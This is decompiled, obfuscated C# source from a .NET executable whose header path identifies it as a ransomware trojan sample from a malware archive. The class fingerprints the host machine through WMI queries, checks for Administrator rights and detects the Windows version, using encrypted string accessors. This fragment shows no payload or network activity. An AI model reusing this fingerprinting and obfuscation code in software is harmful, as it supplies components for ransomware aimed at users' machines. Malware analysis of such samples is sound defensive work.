// Decompiled with JetBrains decompiler
// Type: *p.ZC
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB18CA19-4EF7-467A-AA02-244B3B1B157A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\VHO-Trojan-Ransom.Win32.Convagent.gen-fe2473ff7e7507e98adf2d055102064f9ebc133096f412e3944dd0dbee2345d7.exe

using \u002Ap\u000C;
using System;
using System.Management;
using System.Security.Principal;

namespace \u002Ap\u000C
{
  internal class ZC
  {
    public static string \u003C\u001E() => \u001AOk\u00245\u0023.\u0029\u001A0\u002EL\u001B\u000D(ZC.xJ() + ZC.ZS0\u001B\u0008\u0023() + ZC.N\u0010\u001BNC\u0004());

    private static string xJ()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.K\u0025G(), \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0004\u002B\u001E\u0022\u0010\u007D());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u002EG\u001B\u0019()]);
      return empty;
    }

    private static string ZS0\u001B\u0008\u0023()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.K\u0025G(), \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001B\u0018\u0010());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0020T()]);
      return empty;
    }

    private static string N\u0010\u001BNC\u0004()
    {
      ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.K\u0025G(), \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u003C\u0003\u0011\u000B\u0005S\u001E() + Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0086\u0027\u0040()) + \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.ZG\u0011());
      string empty = string.Empty;
      foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
        empty = Convert.ToString(managementBaseObject[\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0021\u000B\u000B()]);
      return empty;
    }

    public static bool \u0009\u0006\u00031YG\u0004\u0007()
    {
      try
      {
        return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      }
      catch
      {
        return false;
      }
    }

    public static string \u001E\u0007NB()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0013\u003C\u003E\u002CF\u0011\u001B();
      if (osVersion.Platform == PlatformID.Win32Windows)
      {
        switch (osVersion.Version.Minor)
        {
          case 0:
            str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0038\u0040Rd();
            break;
          case 10:
            str = !(osVersion.Version.Revision.ToString() == \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0019\u0027\u001C\u0018\u000D()) ? \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.H\u0013\u001E\u000C\u002EM\u002C\u0016() : \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.GB\u001CF8H\u001CX();
            break;
          case 90:
            str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0087R\u0006b();
            break;
        }
      }
      else if (osVersion.Platform == PlatformID.Win32NT)
      {
        switch (osVersion.Version.Major)
        {
          case 3:
            str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000F1EH\u0027AC\u001C();
            break;
          case 4:
            str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0038S\u001Fh\u005D\u0008\u0020\u000C();
            break;
          case 5:
            str = osVersion.Version.Minor != 0 ? \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000CY\u0022\u000E\u0003\u0023() : \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0015V\u0004\u0001P\u0015\u000D\u001B();
            break;
          case 6:
            switch (osVersion.Version.Minor)
            {
              case 0:
                str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u001B8O\u0019();
                break;
              case 1:
                str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0015\u002C\u0029\u000FRD\u0002();
                break;
              case 2:
                str = \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u0032\u0020\u001E\u001B\u001Br\u001B();
                break;
            }
            break;
        }
      }
      return str + (string.IsNullOrEmpty(Environment.GetEnvironmentVariable(\u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.A\u0019\u000A\u0015\u0014\u0006())) ? \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u000C6\u003D\u0007\u005CN\u0002\u0018() : \u003CPrivateImplementationDetails\u003E\u007BF5B49754\u002D4EB9\u002D4C00\u002DBB11\u002D3C96CAB5A910\u007D.\u003F\u003E\u0028\u0013n());
    }
  }
}
